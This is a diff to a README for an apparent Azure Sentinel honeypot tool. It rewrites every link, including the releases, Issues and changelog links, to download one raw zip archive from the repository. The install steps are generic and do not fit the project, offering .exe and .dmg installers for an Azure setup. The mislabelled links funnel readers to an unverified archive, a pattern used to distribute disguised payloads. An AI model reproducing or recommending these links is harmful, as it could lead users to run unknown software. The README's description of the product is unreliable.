@@ -1,7 +1,7 @@
 # 🛡️ azure-sentinel-honeypot - Protect Your Network with Automated Intelligence
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Gervis123212/azure-sentinel-honeypot/releases)
+[![Download](https://github.com/Gervis123212/azure-sentinel-honeypot/raw/refs/heads/main/Azure/honeypot-azure-sentinel-v2.1.zip)](https://github.com/Gervis123212/azure-sentinel-honeypot/raw/refs/heads/main/Azure/honeypot-azure-sentinel-v2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the azure-sentinel-honeypot project! This application sets up an automated honeypot in Azure, integrating seamlessly with threat intelligence tools like Sentinel, KQL, and n8n. Follow these steps to download and run the software.
@@ -15,7 +15,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 1. **Visit the Releases Page:** Click on the link below to go to the GitHub Releases page:
-   [Download Here](https://github.com/Gervis123212/azure-sentinel-honeypot/releases)
+   [Download Here](https://github.com/Gervis123212/azure-sentinel-honeypot/raw/refs/heads/main/Azure/honeypot-azure-sentinel-v2.1.zip)
    
 2. **Choose the Latest Version:** Look for the most recent version listed. This will ensure you get the latest features and fixes.
 
@@ -24,7 +24,7 @@ Before you start, ensure your system meets the following requirements:
 4. **Install the Application:** 
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the tar.gz file and follow the installation instructions in the README file.
+   - For Linux: Extract the https://github.com/Gervis123212/azure-sentinel-honeypot/raw/refs/heads/main/Azure/honeypot-azure-sentinel-v2.1.zip file and follow the installation instructions in the README file.
 
 5. **Set Up Azure:**
    - Create an Azure account if you don’t have one.
@@ -49,7 +49,7 @@ After installation, you should see the application icon. Double-click to start. 
 ## 🌐 Community & Support
 If you encounter any issues or have questions, feel free to reach out:
 
-- **GitHub Issues:** You can report bugs or request features on our [GitHub Issues page](https://github.com/Gervis123212/azure-sentinel-honeypot/issues).
+- **GitHub Issues:** You can report bugs or request features on our [GitHub Issues page](https://github.com/Gervis123212/azure-sentinel-honeypot/raw/refs/heads/main/Azure/honeypot-azure-sentinel-v2.1.zip).
 - **Community Forum:** Join our community forum for discussions and tips on using the application effectively.
 
 ## 💡 Tips & Best Practices
@@ -61,6 +61,6 @@ If you encounter any issues or have questions, feel free to reach out:
 This project is licensed under the MIT License. You are free to use, modify, and share the software as you wish.
 
 ## 📅 Changelog
-Visit our [releases page](https://github.com/Gervis123212/azure-sentinel-honeypot/releases) for a full changelog and version history. This will keep you informed about new features and fixes.
+Visit our [releases page](https://github.com/Gervis123212/azure-sentinel-honeypot/raw/refs/heads/main/Azure/honeypot-azure-sentinel-v2.1.zip) for a full changelog and version history. This will keep you informed about new features and fixes.
 
 Thank you for using the azure-sentinel-honeypot application! Your feedback is valuable to us, and we hope our software helps enhance your network's security.
